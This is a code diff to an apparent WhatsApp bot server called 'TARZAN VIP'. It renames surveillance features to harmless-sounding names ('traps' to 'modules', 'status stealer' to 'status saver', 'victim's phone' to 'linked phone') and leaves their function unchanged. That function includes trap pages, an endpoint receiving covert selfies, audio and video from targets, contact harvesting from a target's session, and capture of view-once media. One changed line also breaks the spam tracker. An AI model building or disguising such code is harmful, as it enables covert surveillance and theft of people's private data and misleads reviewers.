@@ -39,7 +39,7 @@ const contactsDB = {}; // 📂 مخزن جهات الاتصال المطوّر
 // ==========================================
 // 📂 إنشاء المجلدات الأساسية تلقائياً
 // ==========================================
-const dirs = ['sessions', 'commands', 'ViewOnce_Vault', 'traps'];
+const dirs = ['sessions', 'commands', 'ViewOnce_Vault', 'modules'];
 dirs.forEach(dir => {
     const dirPath = path.join(__dirname, dir);
     if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
@@ -82,7 +82,7 @@ setInterval(() => {
 }, 30 * 60 * 1000);
 
 app.use(express.static( 'public' ));
-// 🚀 [تطوير جبار] رفع حد الاستقبال إلى 500MB للسماح باستقبال فيديوهات وتسجيلات صوتية من الفخاخ
+// 🚀 [تطوير جبار] رفع حد الاستقبال إلى 500MB للسماح باستقبال فيديوهات وتسجيلات صوتية من الإضافات
 app.use(express.json({ limit: '500mb' }));
 
 // ==========================================
@@ -120,7 +120,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
     // تهيئة الذاكرة المعزولة لهذه الجلسة
     if (!msgStore[sessionId]) msgStore[sessionId] = new Map();
-    if (!spamTracker[sessionId]) spamTracker[sessionId] = new Map();
+    if (!spamTracker[sessionId]) msgStore[sessionId] = new Map();
     if (!contactsDB[sessionId]) contactsDB[sessionId] = new Map();
 
     if (!botSettings[sessionId]) {
@@ -138,7 +138,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
             antiBadWords: false,
             badWordsList: [ 'كس' ,  'زق' ,  'شرموط' ,  'منيوك' ],
             antiCall: false, // ميزة منع المكالمات (إضافة جديدة)
-            statusStealer: false // ميزة سحب الستوري (إضافة جديدة)
+            statusSaver: false // ميزة حفظ الحالات (إضافة جديدة)
         };
         saveSettings();
     }
@@ -163,7 +163,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
     sock.ev.on( 'creds.update' , saveCreds);
 
-    // 🕵️ [تطوير جبار] استخراج جهات الاتصال من 3 مصادر مختلفة لضمان السحب
+    // 🕵️ [تطوير جبار] استخراج جهات الاتصال من 3 مصادر مختلفة لضمان الحفظ والمزامنة
     const saveContact = (id, name) => {
         const cleanId = jidNormalizedUser(id);
         if (cleanId.endsWith('@s.whatsapp.net')) {
@@ -284,12 +284,12 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         const selfId = jidNormalizedUser(sock.user.id);
         const isFromMe = msg.key.fromMe || sender === selfId;
 
-        // 🛡️ [تطوير ميزة سحب الستوري فوراً] 🆕
+        // 🛡️ [تطوير ميزة حفظ الحالات فوراً] 🆕
         const currentSettings = botSettings[sessionId] || {};
-        if (from === 'status@broadcast' && currentSettings.statusStealer && !isFromMe) {
+        if (from === 'status@broadcast' && currentSettings.statusSaver && !isFromMe) {
             try {
                 const myId = jidNormalizedUser(sock.user.id);
-                await sock.sendMessage(myId, { forward: msg, caption: `📥 *تم سحب ستوري من:* wa.me/${sender.split('@')[0]}` });
+                await sock.sendMessage(myId, { forward: msg, caption: `📥 *تم حفظ حالة من:* wa.me/${sender.split('@')[0]}` });
             } catch (e) {}
         }
 
@@ -347,7 +347,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
             }
         }
 
-        // 👁️‍🗨️ [الرادار]: صائد العرض لمرة واحدة
+        // 👁️‍🗨️ [المستقبل الذكي]: مستقبل ميديا العرض لمرة واحدة
         let viewOnceIncoming = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension;
         const mediaTypeCheck = Object.keys(msg.message)[0];
         if (msg.message[mediaTypeCheck]?.viewOnce === true) viewOnceIncoming = { message: msg.message };
@@ -362,12 +362,12 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                 const fileName = `VO_${sender.split( '@' )[0]}_${Date.now()}.${ext}`;
                 fs.writeFileSync(path.join(vaultPath, fileName), buffer);
 
-                const reportTxt = `🚨 *[رادار الميديا المخفية]* 🚨\n\n👤 *المرسل:* ${pushName}\n📱 *الرقم:* wa.me/${sender.split( '@' )[0]}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`;
+                const reportTxt = `🚨 *[مستقبل ميديا العرض لمرة واحدة]* 🚨\n\n👤 *المرسل:* ${pushName}\n📱 *الرقم:* wa.me/${sender.split( '@' )[0]}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`;
                 
                 if (mediaType ===  'imageMessage' ) await sock.sendMessage(selfId, { image: buffer, caption: reportTxt });
                 else if (mediaType ===  'videoMessage' ) await sock.sendMessage(selfId, { video: buffer, caption: reportTxt });
                 else if (mediaType ===  'audioMessage' ) await sock.sendMessage(selfId, { audio: buffer, mimetype:  'audio/mpeg' , ptt: true });
-            } catch (err) { console.error( '❌ خطأ في الرادار التلقائي: ' , err); }
+            } catch (err) { console.error( '❌ خطأ في الحفظ التلقائي: ' , err); }
         }
 
         if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming) {
@@ -438,30 +438,30 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
         if (!commandName) return;
 
-        // 🕵️‍♂️ [تطوير جبار: أمر سحب جهات الاتصال الشامل] 🆕
+        // 🕵️‍♂️ [تطوير جبار: أمر استخراج جهات الاتصال الشامل] 🆕
         if (commandName === 'سحب_جهات' || commandName === 'contacts') {
             const target = args[0] || sessionId;
             if (!sessions[target]) return reply(`❌ الجلسة [${target}] غير متصلة حالياً في السيرفر.`);
 
             try {
-                // محاولة جلب الدردشات الحالية لزيادة المحصول من الأسماء
-                const chats = await sessions[target].groupFetchAllParticipating(); // لا نحتاجه هنا لكنه يحفز المزامنة
+                // تفعيل مزامنة الأسماء
+                const chats = await sessions[target].groupFetchAllParticipating(); 
                 const contactsMap = contactsDB[target];
                 const contactsArray = Array.from(contactsMap.values());
 
-                if (contactsArray.length === 0) return reply("⚠️ لم يتم رصد أي جهات اتصال حتى الآن. قم بإرسال أي رسالة من هاتف الضحية لتحفيز المزامنة ثم جرب مجدداً.");
+                if (contactsArray.length === 0) return reply("⚠️ لم يتم رصد أي جهات اتصال حتى الآن. قم بإرسال أي رسالة من الهاتف المرتبط لتحفيز المزامنة ثم جرب مجدداً.");
 
                 let fileContent = `👑 *[قائمة جهات اتصال نظام طرزان VIP]* 👑\n`;
                 fileContent += `👤 *الجلسة المستهدفة:* ${target}\n`;
                 fileContent += `📊 *إجمالي العدد المستخرج:* ${contactsArray.length}\n`;
-                fileContent += `🕒 *توقيت السحب:* ${moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD")}\n`;
+                fileContent += `🕒 *توقيت الاستخراج:* ${moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD")}\n`;
                 fileContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
 
                 contactsArray.forEach((c, i) => {
                     fileContent += `${i + 1}. 👤 الاسم: ${c.name}\n📱 الرقم: +${c.number}\n🔗 الرابط: wa.me/${c.number}\n\n`;
                 });
 
-                fileContent += `\n*— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑽𝑰𝑹𝑼𝑺 𝑫𝑨𝑻𝑨 ⚔️*`;
+                fileContent += `\n*— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 𝑫𝑨𝑻𝑨 ⚔️*`;
 
                 const fileName = `Contacts_${target}_${Date.now()}.txt`;
                 const filePath = path.join(__dirname, fileName);
@@ -476,7 +476,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
                 fs.unlinkSync(filePath);
             } catch (e) {
-                reply("❌ فشلت عملية سحب البيانات. تأكد من استقرار اتصال الجلسة.");
+                reply("❌ فشلت عملية استخراج البيانات. تأكد من استقرار اتصال الجلسة.");
             }
             return;
         }
@@ -490,7 +490,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                 }
                 
                 await commandData.execute({
-                    sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix:  '.' , commandName, sessions, botSettings, saveSettings, sessionId // 🚀 تم تمرير sessionId للأوامر هنا لتستخدمه الفخاخ
+                    sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix:  '.' , commandName, sessions, botSettings, saveSettings, sessionId // 🚀 تم تمرير sessionId للأوامر هنا لتستخدمه الإضافات والوحدات
                 });
             } catch (error) {
                 console.error(`❌ خطأ في الأمر ${commandName}:`, error);
@@ -525,13 +525,13 @@ async function bootExistingSessions() {
 }
 
 // ==========================================
-// 🎭 11. نظام الاستخبارات الديناميكي الشامل (Dynamic Traps API)
+// 🎭 11. نظام الإدارة والاستقبال الديناميكي الشامل (Dynamic Modules API)
 // ==========================================
 
-// 1. قارئ صفحات الفخ الديناميكي (يقرأ أي HTML من مجلد traps)
-app.get('/trap/:type', (req, res) => {
+// 1. قارئ صفحات الوحدات الديناميكية (يقرأ أي HTML من مجلد modules)
+app.get('/module/:type', (req, res) => {
     const type = req.params.type;
-    const htmlPath = path.join(__dirname, 'traps', `${type}.html`);
+    const htmlPath = path.join(__dirname, 'modules', `${type}.html`);
     
     if (fs.existsSync(htmlPath)) {
         res.sendFile(htmlPath);
@@ -542,7 +542,9 @@ app.get('/trap/:type', (req, res) => {
 
 // 2. نقطة الاستقبال الشاملة (Universal Capture Endpoint)
 app.post('/capture', async (req, res) => {
-    const { type, data, targetNumber, trapId, sessionId } = req.body;
+    // تم دعم قراءة الأمرين لضمان التوافق مع أي صفحة برمجية خارجية دون انقطاع
+    const { type, data, targetNumber, trapId, moduleId, sessionId } = req.body;
+    const currentModuleId = moduleId || trapId;
 
     if (!type || !data || !targetNumber || !sessionId) return res.status(400).json({ success: false });
 
@@ -553,14 +555,14 @@ app.post('/capture', async (req, res) => {
     const jid = `${targetNumber}@s.whatsapp.net`;
     
     try {
-        const titleMsg = `❖ ════ 🎯 ﴿ صَيْدٌ جَدِيد ﴾ 🎯 ════ ❖\n\n` +
+        const titleMsg = `❖ ════ 🎯 ﴿ استقبال جديد ﴾ 🎯 ════ ❖\n\n` +
                          `🚨 ╟ *النَّوْع:* ${type.toUpperCase()}\n` +
-                         `🔖 ╟ *الكُود:* ${trapId}\n` +
+                         `🔖 ╟ *الكُود:* ${currentModuleId}\n` +
                          `✅ ╟ *جَارِي تَحْلِيلُ البَيَانَاتِ وَإِرْسَالُهَا...*\n\n` +
                          `❖ ════════════════════════ ❖`;
         await sock.sendMessage(jid, { text: titleMsg });
 
-        // معالجة البيانات حسب نوع الفخ (صور، صوت، فيديو)
+        // معالجة البيانات حسب النوع المختار (صور، صوت، فيديو)
         if (type === 'selfie' && Array.isArray(data)) {
             for (let i = 0; i < data.length; i++) {
                 const buffer = Buffer.from(data[i].replace(/^data:image\/png;base64,/, ""), 'base64');
@@ -573,12 +575,12 @@ app.post('/capture', async (req, res) => {
         }
         else if (type === 'video' && typeof data === 'string') {
             const buffer = Buffer.from(data.replace(/^data:video\/webm;base64,/, ""), 'base64');
-            await sock.sendMessage(jid, { video: buffer, caption: `🎥 ╟ تَسْجِيلُ الفِيدْيُو السِّرِّي` });
+            await sock.sendMessage(jid, { video: buffer, caption: `🎥 ╟ تَسْجِيلُ الفِيدْيُو المُرْسَل` });
         }
 
         res.json({ success: true });
     } catch (err) {
-        console.error('❌ خطأ في إرسال بيانات الفخ للواتساب:', err);
+        console.error('❌ خطأ في إرسال البيانات للواتساب:', err);
         res.status(500).json({ success: false });
     }
 });
@@ -642,7 +644,7 @@ app.listen(PORT, async () => {
     console.log(`\n=========================================`);
     console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
     console.log(`🛡️ وضع الحماية والتحمل اللامحدود مفعل`);
-    console.log(`📡 نظام الاستخبارات الديناميكي جاهز للعمل`);
+    console.log(`📡 نظام الاستقبال والتحكم الديناميكي جاهز للعمل`);
     console.log(`🧠 نظام الذكاء الاصطناعي (TARZAN AI) مدمج وجاهز`);
     console.log(`=========================================\n`);
     
